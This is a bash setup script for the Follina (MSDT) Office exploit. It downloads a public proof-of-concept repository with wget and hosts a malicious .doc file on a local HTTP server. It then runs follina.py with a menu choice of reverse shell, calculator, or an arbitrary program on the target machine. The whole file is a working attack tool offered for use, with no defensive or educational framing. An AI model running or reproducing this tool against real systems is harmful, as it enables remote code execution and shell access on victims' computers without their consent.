#!/bin/bash

echo "welcome to Follina Exploit setup"
sleep 2

echo "to setup/install type 1 or type setup to exploit type 2 or type exploit , You need to install some tools that are required"

yesno="install exploit requirements"
select yesno in $yesno
do
if [ $REPLY = 1 -o $REPLY = "install" ]
	then
	echo "Downloading the Exploit"
	sleep 1
	echo -e ".\c"
	sleep 1
	echo -e ".\c"
	sleep 1
	echo -e ".\c"
	wget https://codeload.github.com/JohnHammond/msdt-follina/zip/refs/heads/main
	sleep 3
	unzip main
	sleep 1
	#python3 msdt-follina-main/follina.py 
	echo 
	echo "its installed type 2 or type exploit to start the exploit"
	elif [ $REPLY = "2" -o $REPLY = "exploit" -o $REPLY = "Exploit" ] 
	then
		echo -e "exploit is about to be ready \c"
		echo -e ".\c"
		sleep 1
		echo -e ".\c"
		sleep 1
		echo -e ".\c"
		echo
		
	echo -e """1:) type 1 or RverseShell for reverse shell \n2:) type 2 or callculator to open calculator \n3:) type 3 to open any program or type any"""
		read type2
		if [ $type2 = "RverseShell" -o $type2 = "1" ]
		then 
		echo "revers shell "
		
		
		red='\033[0;31m'
		clear='\033[0m'
		echo -e "${red}NOTE: DONT DUPLICATE THE PORTS YOU WILL GET ERRORS${clear}" 
		sleep 2
		read -p "put the port for the hosted website to download the malicious .doc file in to target: " port1
		echo "the malicious document is ready to be downloaded from your IP:$port1"
		read -p "Put the port number for reverse shell: " port2 

		cd msdt-follina-main
		konsole --noclose -e python2 -m SimpleHTTPServer $port1 &  python3 follina.py -r  $port2
 		elif [ $type2 = "calculator" -o $type2 = "2" ]
 		then 
 		red='\033[0;31m'
		clear='\033[0m'
		echo -e "${red}NOTE: DONT DUPLICATE THE PORTS YOU WILL GET ERRORS${clear}" 
		sleep 2
 		read -p "put the port for the hosted website to download the malicious .doc file in to target: " port3
 		echo "the malicious document is ready to be downloaded from your IP:$port3"
 		 sleep 4
 		cd msdt-follina-main
		konsole --noclose -e python2 -m SimpleHTTPServer $port3 &  python3 follina.py
 		elif [ $type2="3" -o $type2 = "any" ]
 		then 
 		red='\033[0;31m'
		clear='\033[0m'
 		echo -e "${red}NOTE: DONT DUPLICATE THE PORTS YOU WILL GET ERRORS${clear}" 
 		sleep 2
 		read -p "what you want to open in target machine when the malicous doc is execute ? : " open 
 		read -p "put the port for the hosted website to download the malicious .doc file in to target: " port4
 		echo "the malicious document is ready to be downloaded from your IP:$port4"
 		cd msdt-follina-main
		konsole --noclose -e python2 -m SimpleHTTPServer $port4 &  python3 follina.py -c "$open" 
		fi
 elif [ $REPLY = 3 -o $REPLY = "requirements" ]
 	then
 		sudo apt install konsole 
 	sleep 2
 	echo -e """1) install \n2) exploit
"""
else 
	echo "You typed invalied input pleas read "
fi 
done
